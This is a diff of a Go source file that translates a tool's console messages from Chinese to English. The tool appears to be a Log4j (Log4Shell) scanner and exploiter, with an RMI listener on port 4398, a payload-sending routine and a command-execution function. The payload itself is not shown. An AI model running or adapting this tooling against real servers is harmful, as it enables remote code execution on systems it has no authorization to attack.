@@ -19,27 +19,27 @@ var wg sync.WaitGroup
 func rmiServer() {
 	service := ":4398"
 	tcpAddr, err := net.ResolveTCPAddr("tcp4", service)
-	fmt.Println("[*] 启动端口监听.")
+	fmt.Println("[*] Start listen.")
 	socket, err := net.ListenTCP("tcp", tcpAddr)
 	if err != nil {
-		fmt.Println("[-] 监听端口失败,请检查是否被占用.")
+		fmt.Println("[-] error, please check if the port is occupied.")
 	}
 	conn, err := socket.Accept()
 	if err != nil {
-		fmt.Println("[-] 监听端口失败,请检查是否被占用.")
+		fmt.Println("[-] error, please check if the port is occupied.")
 	}
 	data_byte := [1024]byte{}
 	data, err := conn.Read(data_byte[:])
 	if err != nil {
-		fmt.Println("[-] 接收失败,请检查是否被占用.")
+		fmt.Println("[-] Failure to receive.")
 	}
 	_ = data
 	if firstCheck(data_byte[:]) {
-		fmt.Println("[+] 收到rmi请求")
-		fmt.Println("[+] 目标存在log4j.")
+		fmt.Println("[+] Rmi request received")
+		fmt.Println("[+] Log4j check success.")
 
 	} else {
-		fmt.Println("[*] 收到非rmi请求")
+		fmt.Println("[*] A non-RMI request was received.")
 	}
 	conn.Close()
 	wg.Done()
@@ -86,9 +86,9 @@ func StartScan(url string) {
 }
 
 func StartExploit(url, rmiserv string) {
-	fmt.Println("[*] 正在发送payload...")
+	fmt.Println("[*] Sending payload...")
 	exploit(url, rmiserv)
-	fmt.Println("[*] 发送完成，请检查.")
+	fmt.Println("[*] Send completed, please check.")
 }
 
 func check_alive(url string) {
@@ -99,7 +99,7 @@ func check_alive(url string) {
 	resp, err := client.R().
 		SetHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36").Get(url)
 	if err != nil {
-		fmt.Println("[-] 连接失败，请检查网络.")
+		fmt.Println("[-] Connection failure, please check network.")
 		os.Exit(0)
 	}
 	_ = resp
@@ -217,7 +217,7 @@ func Execc(url, rmiserver, command string) {
 		return
 	}
 
-	fmt.Println("[-] 利用失败或不存在漏洞.")
+	fmt.Println("[-] Exploit failure.")
 }
 
 func getIpAddr2(url string) string {
